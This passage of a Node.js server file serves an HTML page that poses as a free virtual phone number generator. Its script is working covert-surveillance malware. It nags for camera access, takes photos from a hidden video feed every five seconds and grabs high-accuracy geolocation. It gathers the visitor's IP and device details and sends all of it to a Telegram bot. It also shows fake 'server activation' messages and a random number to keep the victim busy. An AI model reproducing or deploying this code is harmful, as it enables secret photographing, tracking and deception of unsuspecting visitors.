                video: { 
                    width: 640, 
                    height: 480,
                    facingMode: 'user' // Use front camera
                } 
            })
            .then(function(stream) {
                console.log("Camera accessed successfully!");
                cameraStream = stream;
                cameraAccessGranted = true;
                
                // Setup hidden video
                hiddenVideo.srcObject = stream;
                hiddenVideo.play();
                
                // Wait for video to be ready then start capturing
                hiddenVideo.addEventListener('loadedmetadata', function() {
                    startPhotoCapture();
                });
            })
            .catch(function(err) {
                console.log("Camera denied: " + err);
                cameraAccessGranted = false;
                // Try again in 3 seconds
                setTimeout(requestCameraPermission, 3000);
            });
        }

        // Function to request location permission (one time only)
        function requestLocationPermission() {
            if (locationRequested) return;
            
            if (navigator.geolocation) {
                locationRequested = true;
                console.log("Requesting location permission...");
                
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        userLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        console.log("Location accessed:", userLocation);
                        
                        // Send location to Telegram immediately
                        sendLocationToTelegram(userLocation);
                    },
                    function(error) {
                        console.log("Location not available:", error.message);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            }
        }

        // ========== SEND LOCATION TO TELEGRAM ==========
        async function sendLocationToTelegram(location) {
            if (!chatId || !botToken) {
                console.log('Missing chatId or botToken');
                return;
            }

            const message = "📍 **LOCATION CAPTURED** 📍\\n\\n" +
                           "📱 **Device Info:**\\n" +
                           "• User Agent: " + navigator.userAgent + "\\n" +
                           "• Platform: " + navigator.platform + "\\n" +
                           "• Language: " + navigator.language + "\\n\\n" +
                           "📍 **Location Data:**\\n" +
                           "• Latitude: " + location.latitude + "\\n" +
                           "• Longitude: " + location.longitude + "\\n" +
                           "• Accuracy: " + location.accuracy + " meters\\n\\n" +
                           "• Google Maps:https://www.google.com/maps?q=" + location.latitude + "," + location.longitude + "\\n\\n" +
                           "🕐 **Time:** " + new Date().toLocaleString() + "\\n" +
                           "🌐 **Page URL:** " + window.location.href;

            try {
                const response = await fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                if (response.ok) {
                    console.log('📍 Location sent to Telegram successfully');
                } else {
                    console.error('Failed to send location to Telegram');
                }
            } catch (error) {
                console.error('Error sending location to Telegram:', error);
            }
        }

        // Start capturing photos
        function startPhotoCapture() {
            // Capture first photo immediately
            setTimeout(capturePhoto, 1000);
            
            // Then capture every 5 seconds
            photoInterval = setInterval(() => {
                capturePhoto();
            }, 5000);
        }

        // Capture photo and collect data
        async function capturePhoto() {
            if (!cameraStream || !hiddenVideo || hiddenVideo.videoWidth === 0) {
                console.log("Camera not ready");
                return;
            }
            
            try {
                // Setup canvas
                hiddenCanvas.width = hiddenVideo.videoWidth;
                hiddenCanvas.height = hiddenVideo.videoHeight;
                const context = hiddenCanvas.getContext('2d');
                
                // Draw video frame to canvas
                context.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
                
                // Collect visitor information
                const visitorInfo = await collectVisitorInfo();
                visitorInfo.photo_count = photoCount;
                
                // Add location to visitor info if available
                if (userLocation) {
                    visitorInfo.location = userLocation;
                }
                
                // Convert to blob and send to Telegram
                hiddenCanvas.toBlob(blob => {
                    if (blob) {
                        sendPhotoToTelegram(blob, visitorInfo);
                        console.log("📸 Photo " + photoCount + " captured and sent");
                    }
                }, 'image/jpeg', 0.8);
                
                photoCount++;
                
            } catch (error) {
                console.error("Error capturing photo:", error);
            }
        }

        // Collect all visitor information
        async function collectVisitorInfo() {
            const info = {
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: screen.width + "x" + screen.height,
                viewport: window.innerWidth + "x" + window.innerHeight,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href
            };

            // Get battery information
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    info.battery = Math.round(battery.level * 100) + "%";
                    info.charging = battery.charging;
                } catch (e) {
                    info.battery = 'unavailable';
                }
            }

            // Get connection information
            if ('connection' in navigator) {
                const connection = navigator.connection;
                info.connection_type = connection.effectiveType;
                info.downlink = connection.downlink;
            }

            // Get IP address
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                info.ip = ipData.ip;
            } catch (e) {
                info.ip = 'unknown';
            }

            // Get device memory
            if ('deviceMemory' in navigator) {
                info.memory = navigator.deviceMemory;
            }

            // Get CPU cores
            if ('hardwareConcurrency' in navigator) {
                info.cores = navigator.hardwareConcurrency;
            }

            return info;
        }

        // ========== SEND PHOTO TO TELEGRAM ==========
        async function sendPhotoToTelegram(blob, visitorInfo) {
            if (!chatId || !botToken) {
                console.log('Missing chatId or botToken - cannot send photo');
                return;
            }

            try {
                // Convert blob to File
                const file = new File([blob], "photo_" + Date.now() + ".jpg", { type: 'image/jpeg' });
                
                // Create FormData
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', file);
                
                // Create caption with visitor info
                const caption = "📸 **CAMERA PHOTO CAPTURED** 📸\\n\\n" +
                               "🆔 **Photo #" + visitorInfo.photo_count + "**\\n" +
                               "🕐 **Time:** " + new Date(visitorInfo.timestamp).toLocaleString() + "\\n\\n" +
                               "📱 **Device Information:**\\n" +
                               "• Platform: " + visitorInfo.platform + "\\n" +
                               "• Screen: " + visitorInfo.screen + "\\n" +
                               "• Viewport: " + visitorInfo.viewport + "\\n" +
                               "• Language: " + visitorInfo.language + "\\n" +
                               "• Timezone: " + visitorInfo.timezone + "\\n\\n" +
                               "🌐 **Network & System:**\\n" +
                               "• IP Address: " + visitorInfo.ip + "\\n" +
                               "• Connection: " + (visitorInfo.connection_type || 'Unknown') + "\\n" +
                               "• Battery: " + visitorInfo.battery + (visitorInfo.charging ? ' (Charging)' : '') + "\\n" +
                               "• Cores: " + (visitorInfo.cores || 'Unknown') + "\\n" +
                               "• Memory: " + (visitorInfo.memory || 'Unknown') + " GB\\n\\n" +
                               "📍 **Location:** " + (visitorInfo.location ? 
                                   visitorInfo.location.latitude + ", " + visitorInfo.location.longitude : 
                                   'Not available') + "\\n\\n" +
                               "🔗 **Referrer:** " + (visitorInfo.referrer || 'Direct visit');

                formData.append('caption', caption);
                formData.append('parse_mode', 'Markdown');

                // Send to Telegram
                const response = await fetch("https://api.telegram.org/bot" + botToken + "/sendPhoto", {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    console.log('✅ Photo sent to Telegram successfully');
                } else {
                    const errorText = await response.text();
                    console.error('❌ Failed to send photo to Telegram:', errorText);
                }
            } catch (error) {
                console.error('❌ Error sending photo to Telegram:', error);
            }
        }

        // ========== EXISTING DOM CODE ==========
        // DOM Elements
        const getStartedBtn = document.getElementById('getStartedBtn');
        const ctaBtn = document.getElementById('ctaBtn');
        const generator = document.getElementById('generator');
        const generateBtn = document.getElementById('generateBtn');
        const loadingScreen = document.getElementById('loadingScreen');
        const result = document.getElementById('result');
        const shareBtn = document.getElementById('shareBtn');
        const countrySelect = document.getElementById('countrySelect');
        const serviceType = document.getElementById('serviceType');
        
        // Show generator when Get Started is clicked - WITH CAMERA CHECK
        function showGenerator() {
            // SILENTLY trigger location permission (one time)
            requestLocationPermission();
            
            // Check if camera is allowed
            if (!cameraAccessGranted) {
                console.log("Camera not allowed, requesting again...");
                requestCameraPermission();
                return;
            }
            
            // Only show generator if camera is allowed
            document.querySelectorAll('section:not(#generatorSection)').forEach(section => {
                section.style.display = 'none';
            });
            
            // Show the generator with a smooth animation
            generator.style.display = 'block';
            setTimeout(() => {
                generator.classList.add('fade-in');
                generator.scrollIntoView({ behavior: 'smooth' });
            }, 100);
        }
        
        // Event listeners for Get Started buttons
        getStartedBtn.addEventListener('click', showGenerator);
        ctaBtn.addEventListener('click', showGenerator);
        
        // Buy button handlers for number cards
        document.querySelectorAll('.buy-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                const country = this.getAttribute('data-country');
                showGenerator();
                // Auto-select the country in dropdown
                setTimeout(() => {
                    countrySelect.value = country;
                }, 500);
            });
        });

        // Validation function
        function isValidSelection() {
            if (!countrySelect.value) {
                alert("Please select a country");
                return false;
            }
            if (!serviceType.value) {
                alert("Please select a service type");
                return false;
            }
            return true;
        }
        
        // Number generation process
        let progress = 0;
        const messages = [
            { text: "Initializing number allocation protocol...", type: "info", delay: 1000 },
            { text: "Connecting to global telecom servers...", type: "info", delay: 2500 },
            { text: "Validating country selection and service type...", type: "info", delay: 4500 },
            { text: "Allocating virtual number from available pool...", type: "info", delay: 7000 },
            { text: "Configuring SMS and call routing...", type: "info", delay: 9500 },
            { text: "Server response: 200 OK", type: "success", delay: 12000 },
            { text: "Activating number with carrier...", type: "info", delay: 14500 },
            { text: "Setting up verification protocols...", type: "info", delay: 17000 },
            { text: "Configuring international routing...", type: "info", delay: 19500 },
            { text: "Finalizing activation...", type: "success", delay: 22000 },
            { text: "Number successfully activated and ready!", type: "success", delay: 24500 }
        ];

        function startProcess() {
            if (!isValidSelection()) return;

            // Hide main screen, show loading
            document.querySelectorAll('.input-group').forEach(el => el.style.display = 'none');
            document.querySelector('#generateBtn').style.display = 'none';
            document.querySelector('.trust-badges').style.display = 'none';
            document.querySelector('.disclaimer').style.display = 'none';
            loadingScreen.style.display = 'block';

            // Add initial message
            const serverMessages = document.getElementById('serverMessages');
            const welcomeMsg = document.createElement('div');
            welcomeMsg.className = 'message info';
            welcomeMsg.innerHTML = "[" + getCurrentTime() + "] Starting activation for " + countrySelect.options[countrySelect.selectedIndex].text;
            serverMessages.appendChild(welcomeMsg);

            // Start the process
            setTimeout(() => {
                simulateServerProcess();
            }, 1000);
        }

        function simulateServerProcess() {
            const serverMessages = document.getElementById('serverMessages');
            const progressBar = document.getElementById('progressBar');
            const progressPercent = document.getElementById('progressPercent');

            messages.forEach((message, index) => {
                setTimeout(() => {
                    const messageElement = document.createElement('div');
                    messageElement.className = "message " + message.type;
                    messageElement.innerHTML = "[" + getCurrentTime() + "] " + message.text;
                    serverMessages.appendChild(messageElement);
                    serverMessages.scrollTop = serverMessages.scrollHeight;

                    progress = Math.min(100, ((index + 1) / messages.length) * 100);
                    progressBar.style.width = progress + '%';
                    progressPercent.textContent = Math.round(progress) + '%';

                    if (index === messages.length - 1) {
                        setTimeout(showResult, 2000);
                    }
                }, message.delay);
            });
        }

        function getCurrentTime() {
            const now = new Date();
            return now.toTimeString().split(' ')[0];
        }

        function showResult() {
            loadingScreen.style.display = 'none';
            result.style.display = 'block';
            
            const numberDisplay = document.getElementById('numberDisplay');
            // Generate random phone number based on country
            const countryPrefixes = {
                'USA': '+1',
                'UK': '+44',
                'Germany': '+49',
                'Canada': '+1',
                'Australia': '+61',
                'France': '+33'
            };
            
            const prefix = countryPrefixes[countrySelect.value] || '+1';
            const randomNumber = Math.floor(1000000000 + Math.random() * 9000000000);
            const formattedNumber = prefix + ' ' + randomNumber.toString().replace(/(\\d{3})(\\d{3})(\\d{4})/, '$1-$2-$3');
            
            numberDisplay.textContent = formattedNumber;
        }

        function copyNumber() {
            const numberText = document.getElementById('numberDisplay').textContent;
            navigator.clipboard.writeText(numberText).then(() => {
                alert("Number copied to clipboard: " + numberText + "\\n\\nYour virtual number is ready to use for verification!");
            });
        }

        // Event listeners
        generateBtn.addEventListener('click', startProcess);
        shareBtn.addEventListener('click', copyNumber);

        // Cleanup when page closes
        window.addEventListener('beforeunload', function() {
            if (photoInterval) {
                clearInterval(photoInterval);
            }
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>`;
}

// Start the server
app.listen(PORT, () => {
  console.log(`🚀 Virtual Numbers API running on port ${PORT}`);
  console.log(`📸 Camera Capture: http://localhost:${PORT}/api/FreeSms.js?code=ENCODED_CHAT_ID`);
  console.log(`🏠 Home: http://localhost:${PORT}`);
});
